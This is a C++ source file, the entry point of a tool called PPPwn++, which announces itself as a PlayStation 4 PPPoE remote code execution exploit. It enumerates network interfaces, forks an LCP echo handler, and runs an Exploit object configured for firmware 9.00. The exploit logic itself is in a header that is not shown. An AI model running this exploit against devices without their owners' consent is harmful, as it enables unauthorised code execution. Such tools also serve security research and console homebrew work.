#include <iostream>
#include <PcapLiveDeviceList.h>

#include "exploit.h"

#ifdef _WIN32
void cleanup(int ret) {
    exit(ret);
}
#else
#include <csignal>
#include <unistd.h>
static pid_t pid;
void cleanup(int ret) {
    if( pid > 0) kill(pid, SIGKILL);
    exit(ret);
}
static void signal_handler(int sig_num) {
    signal(sig_num, signal_handler);
    cleanup(sig_num);
}
#endif

int main(int argc, char *argv[]) {
    std::cout << "[+] PPPwn++ - PlayStation 4 PPPoE RCE by theflow" << std::endl;
    std::cout << "[+] args: <interface>" << std::endl;

    std::cout << "[+] interfaces: " << std::endl;
    std::vector<pcpp::PcapLiveDevice*> devList = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDevicesList();
    for (pcpp::PcapLiveDevice* dev : devList) {
        std::cout << dev->getName() << " " << dev->getDesc() << std::endl;
    }
    std::cout << std::endl;

    // todo: add argument parsing
    std::string interfaceName;
    if (argc > 1) {
        interfaceName = argv[1];
    } else {
        std::cerr << "[-] No interface name provided." << std::endl;
        return 1;
    }

#ifdef _WIN32
    // todo run LcpEchoHandler
    Exploit exploit(OffsetsFirmware_900(), interfaceName);
    exploit.run();
#else
    pid = fork();
    if (pid < 0) {
        std::cerr << "[-] Cannot run LcpEchoHandler" << std::endl;
    } else if (pid == 0) {
        LcpEchoHandler lcp_echo_handler(interfaceName);
        lcp_echo_handler.run();
    } else {
        signal(SIGPIPE, SIG_IGN);
        signal(SIGINT, signal_handler);
        signal(SIGTERM, signal_handler);
        Exploit exploit;
        if(exploit.setFirmwareVersion(FIRMWARE_900)) cleanup(1);
        if(exploit.setInterface(interfaceName)) cleanup(1);
        exploit.run();
        kill(pid, SIGTERM);
    }
#endif
    return 0;
}
